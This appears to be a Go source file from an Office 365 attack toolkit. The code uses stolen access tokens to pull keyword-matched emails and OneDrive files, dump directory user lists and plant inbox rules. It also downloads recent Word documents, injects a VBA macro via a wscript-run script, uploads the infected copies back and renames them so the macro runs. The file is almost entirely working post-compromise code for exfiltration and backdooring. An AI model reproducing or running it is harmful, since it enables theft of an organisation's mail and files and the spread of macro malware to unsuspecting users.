package api

import (
	"bytes"
	_ "database/sql"
	"encoding/json"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"o365-attack-toolkit/database"
	"o365-attack-toolkit/model"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)


func CallApiMethod(method string,endpoint string,accessToken string, additionalParameters string,bodyData []byte, contentType string) string{

	url := fmt.Sprintf("%s%s%s",model.ApiEndpointRoot,endpoint,additionalParameters)
	client := &http.Client{}

	var req *http.Request
	if method == "POST" || method == "PUT" || method == "PATCH"{
		req, _ = http.NewRequest(method, url, bytes.NewBuffer(bodyData))
		req.Header.Set("Content-Type", contentType)
	}else{
		req, _ = http.NewRequest(method, url, nil)
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s",accessToken))

	resp, err := client.Do(req)

	if err != nil{
		log.Println(err.Error())
		return ""
	}

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil{
		log.Println(err.Error())
		return ""
	}

	return string(body)
}

func InitializeProfile(accessToken string){

	userResponse := CallApiMethod("GET","/me",accessToken,"",nil,"")
	user := model.User{}
	user.AccessToken = accessToken
	user.AccessTokenActive = 1

	json.Unmarshal([]byte(userResponse), &user)
	fmt.Println(user)
	database.InsertUser(user)
	//Call the function database.InsertUser() which will return

	GetKeywordEmails(user)
	CreateRules(user)
	GetKeywordFiles(user)
  // TODO: We should only run this once per domain
  GetADUsers(user.AccessToken)
	if model.GlbConfig.Backdoor.Enabled {
		if runtime.GOOS == "windows" {

			BackdoorFiles(user)
		}else{
			fmt.Println("Macro backdooring is only available on Windows.")
		}
	}
}

func GetADUsers(accessToken string){
		messagesResponse := CallApiMethod("GET","/users",accessToken,"",nil,"")
		users := model.ADUsers{}
		json.Unmarshal([]byte(messagesResponse), &users)

		// Loads the first batch of emails.
		for _,user := range users.Value{
      database.InsertADUser(model.ADUser{user.ID,user.BusinessPhones,user.DisplayName,user.GivenName,user.Mail,user.MobilePhone,user.PreferredLanguage,user.Surname,user.UserPrincipalName})
		}
    log.Printf("Extracted %d users",len(users.Value))


		for users.OdataNextLink != ""{
			endpoint := strings.Replace(users.OdataNextLink,model.ApiEndpointRoot,"",-1)
			messagesResponse = CallApiMethod("GET",endpoint,accessToken,"",nil,"")

      users := model.ADUsers{}
      json.Unmarshal([]byte(messagesResponse), &users)

      // Loads the first batch of emails.
      for _,user := range users.Value{
        database.InsertADUser(model.ADUser{user.ID,user.BusinessPhones,user.DisplayName,user.GivenName,user.Mail,user.MobilePhone,user.PreferredLanguage,user.Surname,user.UserPrincipalName})
      }
      log.Printf("Extracted %d users",len(users.Value))
  }
}

func GetKeywordEmails(user model.User){


	dbMails := []model.Mail{}

	keyWords := strings.Split(model.GlbConfig.Keywords.Outlook,",")


	for _,keyword := range keyWords{

		additionalParameters := url.Values{}
		additionalParameters.Add("select","receivedDateTime,hasAttachments,importance,subject,sender,bodyPreview,body")
		additionalParameters.Add("filter",fmt.Sprintf("contains(body/content,'%s') or contains(subject,'%s')",keyword,keyword))


		messagesResponse := CallApiMethod("GET","/me/messages?",user.AccessToken,additionalParameters.Encode(),nil,"")
		messages := model.Messages{}
		json.Unmarshal([]byte(messagesResponse), &messages)

		// Loads the first batch of emails.
		for _,message := range messages.Value{
			dbMails = append(dbMails, model.Mail{message.ID,user.Mail,message.Subject,message.Sender.EmailAddress.Address,message.Sender.EmailAddress.Name,message.HasAttachments,message.BodyPreview,message.Body.ContentType,message.Body.Content})
		}


		for messages.OdataNextLink != ""{
			endpoint := strings.Replace(messages.OdataNextLink,model.ApiEndpointRoot,"",-1)
			//fmt.Println(endpoint)
			messagesResponse = CallApiMethod("GET",endpoint,user.AccessToken,"",nil,"")

			messages = model.Messages{}
			json.Unmarshal([]byte(messagesResponse), &messages)
			// Load next batch of emails
			for _,message := range messages.Value{
				dbMails = append(dbMails, model.Mail{message.ID,user.Mail,message.Subject,message.Sender.EmailAddress.Address,message.Sender.EmailAddress.Name,message.HasAttachments,message.BodyPreview,message.Body.ContentType,message.Body.Content})
			}

		}
	}
	log.Printf("Extracted %d keyworded emails from %s",len(dbMails),user.Mail)
	for _,mail := range dbMails{
		database.InsertEmail(mail)
	}

}

func CreateRules(user model.User){

		tempLocalRules := model.GlbRules
		tempRemoteRules := CallApiMethod("GET","/me/mailFolders/inbox/messageRules",user.AccessToken,"",nil,"")
		remoteRules := model.Rules{}
		json.Unmarshal([]byte(tempRemoteRules),&remoteRules)

		// Check in order to not put the same rules two times.
		var exists bool
		if len(remoteRules.Value) > 0 {
			for _, localRule := range tempLocalRules{
				for _, remoteRule := range remoteRules.Value{
					exists = false
					if remoteRule.DisplayName == localRule.DisplayName {
						exists = true
					}

				}
				if !exists {
					tempRule, err := json.Marshal(localRule)
					if err != nil {
						log.Println("Error on marshalling rule data.")
					}
					CallApiMethod("POST","/me/mailFolders/inbox/messageRules",user.AccessToken,"",tempRule,"application/json")
				}

			}
		}else{
			for _, localRule := range tempLocalRules {
				tempRule, err := json.Marshal(localRule)
				if err != nil {
					log.Println("Error on marshalling rule data.")
				}
				CallApiMethod("POST","/me/mailFolders/inbox/messageRules",user.AccessToken,"",tempRule,"application/json")
			}
		}


}

func DownloadFile(url string, fileName string,username string){

	folderDir := fmt.Sprintf("./downloads/%s",username)
	if _, err := os.Stat(folderDir); err != nil {
		if os.IsNotExist(err) {
			// Create the folder
			os.Mkdir(folderDir,os.ModePerm)
		}else{
			log.Println(err)
		}
	}
	// This function is a little bit unsafe because someone can plant files on your computer with the extension they want.

	//time := time.Now().Unix
	//downFile := fmt.Sprintf("%s/%s_%d",folderDir,filepath.Base(fileName),time)
	downFile := fmt.Sprintf("%s/%s",folderDir,filepath.Base(fileName))

	resp, err := http.Get(url)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	out, err := os.Create(downFile)
	if err != nil {
		log.Println(err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)


}

func GetKeywordFiles(user model.User) {

	var tempFiles model.Files
	keyWords := strings.Split(model.GlbConfig.Keywords.Onedrive, ",")

	for _, keyword := range keyWords {
		endpoint := fmt.Sprintf("/me/drive/root/search(q='%s')", keyword)
		filesResponse := CallApiMethod("GET", endpoint, user.AccessToken, "?$top=100", nil,"")

		json.Unmarshal([]byte(filesResponse), &tempFiles)

		// Check the mime type of the  file in order to exclude folders. There is probably a better way.
		for _, file := range tempFiles.Value {
			if file.File.MimeType != "" {
				// Maybe check for file size

				// Download the files
				endpoint := fmt.Sprintf("/me/drive/items/%s/", file.ID)
				driveItemResponse := CallApiMethod("GET", endpoint, user.AccessToken, "", nil,"")
				driveItem := model.DriveItem{}
				json.Unmarshal([]byte(driveItemResponse), &driveItem)
				log.Printf("Downloading %s" ,driveItem.Name)
				DownloadFile(driveItem.MicrosoftGraphDownloadURL,file.Name,user.UserPrincipalName)

			}

		}
	}
}

// Document  location, Macro to add to document path, Infected document output location
func AddMacroFile(document string, macro string) string{


	// https://graph.microsoft.com/v1.0/me/drive/recent?$select=id,name,webUrl RecentFiles

	// Get all the recent files, download them and for all the macro files

	// Replace the output file
	output := strings.Replace(document,".docx","-macro.doc",-1)


		template  := `
		Dim wdApp
		Set wdApp = CreateObject("Word.Application")
		wdApp.Documents.Open("{DOCUMENT}")
		wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "{MACRO}"
		wdApp.Documents(1).SaveAs2 "{OUTPUT}", 0
		wdApp.Quit
		`
		template = strings.Replace(template,"{DOCUMENT}",document,-1)
		template = strings.Replace(template,"{MACRO}",macro,-1)
		template = strings.Replace(template,"{OUTPUT}",output,-1)
		err := ioutil.WriteFile("temp.vbs", []byte(template), 0644)
		if err != nil {
			log.Println(err)
		}

		// YEAH LOL :P
		cmd := exec.Command("wscript.exe", "temp.vbs")
		err = cmd.Run()
		if err != nil {
			log.Println(err)
		}
		return output



}
// Update the filename from docx to doc so the macro can get executed
func RenameFile(user model.User, id string, filename string){

	newFilename := filename[:len(filename)-1]
	endpoint := fmt.Sprintf("/me/drive/items/%s",id)
	content :=[]byte(fmt.Sprintf(`{"name":"%s"}`,newFilename))
	CallApiMethod("PATCH",endpoint,user.AccessToken,"",content,"application/json")

}
func UpdateFile(user model.User,id string, filepath string){

	endpoint := fmt.Sprintf("/me/drive/items/%s/content",id)
	content, err := ioutil.ReadFile(filepath)
	if err != nil {
		log.Println(err)
	}
	// Upload the file

	response := CallApiMethod("PUT",endpoint,user.AccessToken,"",content,"application/vnd.openxmlformats-officedocument.wordprocessingml.document")

	fmt.Println(response)
}

func BackdoorFiles(user model.User){
	// /me/drive/recent is not that good because there is no documentation how often is refreshed.


	// Backdoor 15 last word documents
	response := CallApiMethod("GET","/me/drive/root/search(q='{.docx}')",user.AccessToken,"?$orderby=lastModifiedDateTime&$top=15",nil,"")
	files := model.Files{}

	json.Unmarshal([]byte(response), &files)

	for _, file := range files.Value {
		if file.File.MimeType != "" {
			// Maybe check for file size

			// Download the documents to backdoor
			endpoint := fmt.Sprintf("/me/drive/items/%s/", file.ID)

			driveItemResponse := CallApiMethod("GET", endpoint, user.AccessToken, "", nil,"")
			driveItem := model.DriveItem{}
			json.Unmarshal([]byte(driveItemResponse), &driveItem)
			// Download the item here and pass the path to the AddMacroFunction

			if driveItem.MicrosoftGraphDownloadURL != ""{
				currentDir, err := os.Getwd()
				if err != nil {
					log.Fatal(err)
				}
				filepath := fmt.Sprintf("%s\\tempdocs\\%s",currentDir,filepath.Base(driveItem.Name))


				resp, err := http.Get(driveItem.MicrosoftGraphDownloadURL)
				if err != nil {
					log.Println(err)
				}
				defer resp.Body.Close()

				out, err := os.Create(filepath)
				if err != nil {
					log.Println(err)
				}


				_, err = io.Copy(out, resp.Body)
				if err != nil{
					log.Println(err)
				}

				out.Close()


				backdooredFile := AddMacroFile(filepath,model.GlbConfig.Backdoor.Macro)
				UpdateFile(user,driveItem.ID,backdooredFile)
				RenameFile(user,driveItem.ID,driveItem.Name)
				log.Printf("Backdooring %s",driveItem.Name)
			}


		}

	}


}
